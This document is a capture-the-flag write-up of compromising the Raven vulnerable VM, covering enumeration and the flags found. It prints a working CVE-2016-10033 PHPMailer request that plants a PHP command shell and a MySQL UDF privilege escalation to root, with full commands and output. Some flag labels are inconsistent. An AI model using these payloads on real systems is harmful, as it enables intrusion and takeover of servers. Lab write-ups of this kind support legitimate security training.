@@ -1,0 +1,310 @@
+************************************************************************************************************************
+************************************************************************************************************************ 
+**																													                                                          **
+** Before diving into Raven VM, let me remind you that this machine has 4 flags and 2 way to get an root access. 	    ** 
+** This write-up will discuss the steps that I followed to compromise this vulnerable machine. 	       				        **
+** 										 	  																		                                                        ** 
+************************************************************************************************************************
+************************************************************************************************************************
+
+===============================
+|| 		Enumeration			       ||
+===============================
+
+1. I fired up nmap against Raven VM to look for open ports by doing :
+
+# nmap -sV -O -A -T4 192.168.58.145
+
+Starting Nmap 7.25BETA1 ( https://nmap.org ) at 2018-11-08 03:41 CET
+Nmap scan report for 192.168.58.145
+Host is up (0.00042s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
+|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
+|_  256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
+80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Raven Security
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          35499/tcp  status
+|_  100024  1          46897/udp  status
+MAC Address: 00:0C:29:D4:4F:DE (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.43 ms 192.168.58.145
+
+2. The web server is not exposed to severe vulnerabilties as shown below 
+(Expect the existiong of virtual host configuration "raven.local"):
+
+# nikto -h 192.168.58.145
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.58.145
++ Target Hostname:    192.168.58.145
++ Target Port:        80
++ Start Time:         2018-11-08 03:49:02 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.10 (Debian)
++ Server leaks inodes via ETags, header found with file /, fields: 0x41b3 0x5734482bdcb00 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
++ OSVDB-3233: /icons/README: Apache default file found.
++ Uncommon header 'link' found, with contents: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
++ /wordpress/: A Wordpress installation was found.
++ 7535 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2018-11-08 03:49:21 (GMT1) (19 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Next,  I ran dirb to list all the available directories on raven.local (changed on /etc/hosts)
+---- Scanning URL: http://raven.local/ ----
+==> DIRECTORY: http://raven.local/css/                                      
+==> DIRECTORY: http://raven.local/fonts/                                    
+==> DIRECTORY: http://raven.local raven.local/img/                                      
++ http://raven.local/index.html (CODE:200|SIZE:16819)                       
+==> DIRECTORY: http://raven.local/js/                                       
+==> DIRECTORY: http://raven.local/manual/                                   
++ http://raven.local/server-status (CODE:403|SIZE:302)                      
+==> DIRECTORY: http://raven.local/vendor/                                   
+==> DIRECTORY: http://raven.local /wordpress/
+
+The result shows that there is a wordpress installation ('/wordpress/') and other listable directories (such as '/vendor/'). 
+Let's browse the web application : 
+
+* The first flag was found on the HTML source of http://raven.local/service.html : flag1{b9bbcb33e11b80be759c4e844862482d}
+* The content of vender directory is :  
+[PARENTDIR]	Parent Directory	 	- 	 
+[ ]	LICENSE	2018-08-13 07:56 	26K	 
+[ ]	PATH	2018-08-13 17:29 	22 	 
+[ ]	PHPMailerAutoload.php	2018-08-13 07:56 	1.6K	 
+[ ]	README.md	2018-08-13 07:56 	13K	 
+[ ]	SECURITY.md	2018-08-13 07:56 	2.3K	 
+[ ]	VERSION	2018-08-13 07:56 	6 	 
+[ ]	changelog.md	2018-08-13 07:56 	28K	 
+[ ]	class.phpmailer.php	2018-08-13 07:56 	141K	 
+[ ]	class.phpmaileroauth.php	2018-08-13 07:56 	7.0K	 
+[ ]	class.phpmaileroauthgoogle.php	2018-08-13 07:56 	2.4K	 
+[ ]	class.pop3.php	2018-08-13 07:56 	11K	 
+[ ]	class.smtp.php	2018-08-13 07:56 	41K	 
+[ ]	composer.json	2018-08-13 07:56 	1.1K	 
+[ ]	composer.lock	2018-08-13 07:56 	126K	 
+[DIR]	docs/	2018-08-13 07:56 	- 	 
+[DIR]	examples/	2018-08-13 07:56 	- 	 
+[DIR]	extras/	2018-08-13 07:56 	- 	 
+[ ]	get_oauth_token.php	2018-08-13 07:56 	4.9K	 
+[DIR]	language/	2018-08-13 07:56 	- 	 
+[DIR]	test/	2018-08-13 07:56 	- 	 
+[ ]	travis.phpunit.xml.dist	2018-08-13 07:56 	1.0K	 
+
+========================================
+|| 		 VA & Gaining access		  ||
+========================================
+
+3. I thought, based on information collected so far that, that the web application is vulnerable to CVE-2016-10033 
+but mail.php was not found according to the following response header :
+
+HTTP/1.1 404 Not Found
+Date: Fri, 09 Nov 2018 17:50:40 GMT
+Server: Apache/2.4.10 (Debian)
+Content-Length: 286
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL /mail.php was not found on this server.</p>
+<hr>
+<address>Apache/2.4.10 (Debian) Server at 192.168.58.145 Port 80</address>
+</body></html>
+
+4. I got stuck at this point after trying to compromise the blog http://raven.local/wordpress/ 
+(Vulnerability assement, password cracking) until I ran acunitix VS against the web application 
+and it gave me a valuable information : Existing of Backup file contact.zip
+Afer downloading the exiting file, this code snippet shows that the web app is actually affected with CVE-2016-10033 : 
+
+<?php
+				if (isset($_REQUEST['action'])){
+					$name=$_REQUEST['name'];
+					$email=$_REQUEST['email'];
+					$message=$_REQUEST['message'];
+					if (($name=="")||($email=="")||($message=="")){
+						echo "There are missing fields.";
+					}else{		
+						require 'vulnerable/PHPMailerAutoload.php';
+						$mail = new PHPMailer;
+						$mail->Host = "localhost";
+						$mail->setFrom($email, 'Vulnerable Server');
+						$mail->addAddress('admin@vulnerable.com', 'Hacker');
+						$mail->Subject  = "Message from $name";
+						$mail->Body     = $message;
+						if(!$mail->send()) {
+							echo 'Message was not sent.';
+							echo 'Mailer error: ' . $mail->ErrorInfo;
+						} else {
+							echo 'Message has been sent.';
+						}
+					}
+				}  
+				?>
+
+Manualy, I injected this payload using burpsuite:
+
+POST /contact.php HTTP/1.1 <-- changed mail.php
+Host: 192.168.58.145
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
+Accept: text/html, */*; q=0.01
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Referer: http://192.168.58.145/contact.php
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 86
+Connection: close
+
+action=submit&name=ss&email="attacker\" -oQ/tmp/ -Xvendor/shell.php  some"@lala.com&message=<?php system($_GET['c']); ?>
+
+Next, I used web_delivery exploit on metasploit to have a low privileged access and this are my findings : 
+
+** The 2nd flag is located on /var/html/www/flag2.txt : flag3{afc01ab56b50591e7dccf93122770cd2}
+** The 3rd and 4th flag are in the wp_posts table on mysql (U can have the mysql password on /var/www/html/wordpress/wp-config.php) : 
+flag4{715dea6c055b9fe3337544932f2941ce}
+
+========================================
+|| 		 Privilge escalation		  ||
+========================================
+
+5. Since the exploit scripts provided by LinEnum.sh were not effective, the potential exploit was UDF injection since mysql version is 5.5.60 (https://www.exploit-db.com/exploits/1518/). Note, you need to compile the C code on your box not Raven.
+
+mysql> use mysql;
+use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+mysql> create table root(line blob);
+create table root(line blob);
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> insert into root values (load_file('/tmp/raptor_udf2.so'));
+insert into root values (load_file('/tmp/raptor_udf2.so'));
+Query OK, 1 row affected (0.01 sec)
+
+mysql> select * from root into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+<nto dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';                        
+Query OK, 1 row affected (0.04 sec)
+
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> select * from mysql.func;
+select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+1 row in set (0.00 sec)
+
+mysql> select do_system('id > /tmp/out; chown www-data.www-data /tmp/out');
+select do_system('id > /tmp/out; chown www-data.www-data /tmp/out');
++--------------------------------------------------------------+
+| do_system('id > /tmp/out; chown www-data.www-data /tmp/out') |
++--------------------------------------------------------------+
+|                                                            0 |
++--------------------------------------------------------------+
+1 row in set (0.01 sec)
+
+mysql> \! sh
+\! sh
+$ cat /tmp/out
+cat /tmp/out
+uid=0(root) gid=0(root) groups=0(root)
+$ exit
+exit
+mysql> select do_system('ls /root/> /tmp/out; chown www-data.www-data /tmp/out');
+< /root/> /tmp/out; chown www-data.www-data /tmp/out');                      
++--------------------------------------------------------------------+
+| do_system('ls /root/> /tmp/out; chown www-data.www-data /tmp/out') |
++--------------------------------------------------------------------+
+|                                                                  0 |
++--------------------------------------------------------------------+
+1 row in set (0.04 sec)
+mysql> \! sh
+\! sh
+$ cat /tmp/out
+cat /tmp/out
+flag4.txt
+$ exit
+exit
+mysql> select do_system('cat /root/flag4.txt > /tmp/out; chown www-data.www-data /tmp/out');
+<t /root/flag4.txt > /tmp/out; chown www-data.www-data /tmp/out');           
++-------------------------------------------------------------------------------+
+| do_system('cat /root/flag4.txt > /tmp/out; chown www-data.www-data /tmp/out') |
++-------------------------------------------------------------------------------+
+|                                                                             0 |
++-------------------------------------------------------------------------------+
+1 row in set (0.05 sec)
+
+mysql> \? sh
+\? sh
+
+Nothing found
+Please try to run 'help contents' for a list of all accessible topics
+
+mysql> \! sh
+\! sh
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ cat /tmp/out
+cat /tmp/out
+______                      
+
+| ___ \                     
+
+| |_/ /__ ___   _____ _ __  
+
+|    // _` \ \ / / _ \ '_ \ 
+
+| |\ \ (_| |\ V /  __/ | | |
+
+\_| \_\__,_| \_/ \___|_| |_|
+
+                            
+flag4{715dea6c055b9fe3337544932f2941ce}
+
+CONGRATULATIONS on successfully rooting Raven!
+
+This is my first Boot2Root VM - I hope you enjoyed it.
+
+Hit me up on Twitter and let me know what you thought: 
+
+@mccannwj / wjmccann.github.io
+$ 
